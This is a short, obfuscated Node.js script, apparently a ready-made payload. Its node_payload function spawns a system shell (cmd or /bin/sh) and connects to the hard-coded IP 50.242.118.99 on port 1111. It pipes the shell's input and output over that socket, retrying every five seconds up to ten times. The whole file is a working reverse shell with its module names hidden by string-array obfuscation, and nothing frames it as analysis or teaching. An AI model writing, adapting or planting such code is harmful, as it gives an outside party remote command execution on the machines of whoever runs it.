function _0x5eee() {
    var _0x1ebcf1 = [
        '99qKeVlV',
        '12372360GLbtoY',
        'process',
        'child_process',
        'connect',
        'undefined',
        'stderr',
        'socket',
        '829ELhQaY',
        '184lgeceI',
        '806259KaBwVi',
        '1840968YVjPcH',
        '2600130jUpXtc',
        '364410EDeFYw',
        '21fBbFsj',
        '416360QwHItJ'
    ];
    _0x5eee = function () {
        return _0x1ebcf1;
    };
    return _0x5eee();
}
function _0x2005(_0x4328d5, _0x5eeeeb) {
    var _0x200557 = _0x5eee();
    _0x2005 = function (_0x37d832, _0x37eefe) {
        _0x37d832 = _0x37d832 - 0x0;
        var _0x13bf55 = _0x200557[_0x37d832];
        return _0x13bf55;
    };
    return _0x2005(_0x4328d5, _0x5eeeeb);
}
(function (_0x5f3f93, _0x5bd153) {
    var _0x3117b2 = _0x2005;
    var _0x3bdc42 = _0x5f3f93();
    while (!![]) {
        try {
            var _0x521125 = parseInt(_0x3117b2(0x0)) / 0x1 * (parseInt(_0x3117b2(0x1)) / 0x2) + -parseInt(_0x3117b2(0x2)) / 0x3 + -parseInt(_0x3117b2(0x3)) / 0x4 + -parseInt(_0x3117b2(0x4)) / 0x5 + -parseInt(_0x3117b2(0x5)) / 0x6 * (parseInt(_0x3117b2(0x6)) / 0x7) + -parseInt(_0x3117b2(0x7)) / 0x8 * (-parseInt(_0x3117b2(0x8)) / 0x9) + parseInt(_0x3117b2(0x9)) / 0xa;
            if (_0x521125 === _0x5bd153) {
                break;
            } else {
                _0x3bdc42['push'](_0x3bdc42['shift']());
            }
        } catch (_0x445138) {
            _0x3bdc42['push'](_0x3bdc42['shift']());
        }
    }
}(_0x5eee, 0x6f075));
function node_payload() {
    var _0x5729cc = _0x2005;
    var _0x4203bc = global['require'] || global[_0x5729cc(0xa)]['mainModule']['constructor']['_load'];
    if (!_0x4203bc)
        return;
    var _0x29105d = global[_0x5729cc(0xa)]['platform']['match'](/^win/i) ? 'cmd' : '/bin/sh';
    var _0x31c7ed = _0x4203bc('net');
    var _0x2729b9 = _0x4203bc(_0x5729cc(0xb));
    var _0x4990c9 = _0x4203bc('util');
    var _0x38e5c7 = _0x2729b9['spawn'](_0x29105d, []);
    var _0x26dde3 = this;
    var _0x5cc3c4 = 0x0;
    function _0x4c38f2() {
        var _0x11f745 = _0x2005;
        _0x26dde3['socket'] = _0x31c7ed[_0x11f745(0xc)](0x457, '50.242.118.99', function () {
            var _0x28233f = _0x2005;
            _0x26dde3['socket']['pipe'](_0x38e5c7['stdin']);
            if (typeof _0x4990c9['pump'] === _0x28233f(0xd)) {
                _0x38e5c7['stdout']['pipe'](_0x26dde3['socket']);
                _0x38e5c7['stderr']['pipe'](_0x26dde3['socket']);
            } else {
                _0x4990c9['pump'](_0x38e5c7['stdout'], _0x26dde3['socket']);
                _0x4990c9['pump'](_0x38e5c7[_0x28233f(0xe)], _0x26dde3['socket']);
            }
        });
        _0x26dde3[_0x11f745(0xf)]['on']('error', function (_0x4cba65) {
            _0x5cc3c4++;
            if (_0x5cc3c4 <= 0xa) {
                setTimeout(function () {
                    _0x4c38f2();
                }, 0x5 * 0x3e8);
            } else {
                process['exit']();
            }
        });
    }
    _0x4c38f2();
}
console['log']('poop');
node_payload();
